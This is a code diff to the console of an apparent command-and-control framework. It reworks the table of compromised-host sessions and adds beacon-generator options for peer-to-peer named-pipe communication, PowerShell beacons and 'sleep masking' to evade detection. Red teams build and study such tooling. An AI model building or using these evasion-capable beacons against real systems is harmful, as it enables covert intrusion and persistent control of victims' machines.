@@ -91,12 +91,16 @@ class C2Console:
         if not sessions:
             print("[*] No sessions registered.")
             return
-        print(f"\n  {'ID':<10} {'User':<15} {'Host':<15} {'OS':<20} {'IP':<16} {'Last Seen':<22} {'Status'}")
-        print("  " + "-" * 108)
+        print(f"\n  {'ID':<10} {'User':<15} {'Host':<15} {'IP':<16} {'Parent':<10} {'Last Seen':<22} {'Status'}")
+        print("  " + "-" * 105)
         for s in sessions:
             status_color = "\033[92m" if s['status'] == 'active' else "\033[91m"
-            print(f"  {s['id']:<10} {s['username']:<15} {s['hostname']:<15} "
-                  f"{(s['os'] or '')[:20]:<20} {s['ip']:<16} {s['last_seen']:<22} "
+            parent = s.get('parent_id') or '-'
+            username = (s['username'] or '')[:14]
+            hostname = (s['hostname'] or '')[:14]
+            ip = s['ip'] or ''
+            print(f"  {s['id']:<10} {username:<15} {hostname:<15} "
+                  f"{ip:<16} {parent:<10} {s['last_seen']:<22} "
                   f"{status_color}{s['status']}\033[0m")
         print()
 
@@ -178,14 +182,23 @@ class C2Console:
 
     def _generate(self, args):
         lang = args.strip() or "python"
-        url = input("  C2 callback URL (e.g. http://10.0.0.1:8443): ").strip()
+        ptp = input("  P2P mode [none, named-pipe]: ").strip() or "none"
+        if ptp == "named-pipe":
+            url = None
+            pipe = input("  Named pipe name [hider_c2]: ").strip() or "hider_c2"
+            lang = "powershell"
+        else:
+            url = input("  C2 callback URL (e.g. http://10.0.0.1:8443): ").strip()
+            pipe = "hider_c2"
+            
         sleep = int(input("  Sleep interval in seconds [5]: ").strip() or "5")
         jitter = int(input("  Jitter percentage [20]: ").strip() or "20")
         kill = input("  Kill date (YYYY-MM-DD or blank): ").strip() or None
+        mask = input("  Enable sleep masking [y/N]: ").strip().lower() == "y"
         ext = ".py" if lang == "python" else ".ps1"
         out = input(f"  Output path [beacon{ext}]: ").strip() or f"beacon{ext}"
 
-        code = BeaconGen.generate(url, lang=lang, sleep_sec=sleep, jitter_pct=jitter, kill_date=kill)
+        code = BeaconGen.generate(callback_url=url, lang=lang, sleep_sec=sleep, jitter_pct=jitter, kill_date=kill, ptp=ptp, pipe_name=pipe, sleep_mask=mask)
         with open(out, 'w') as f:
             f.write(code)
         print(f"[+] Beacon written to {out}")
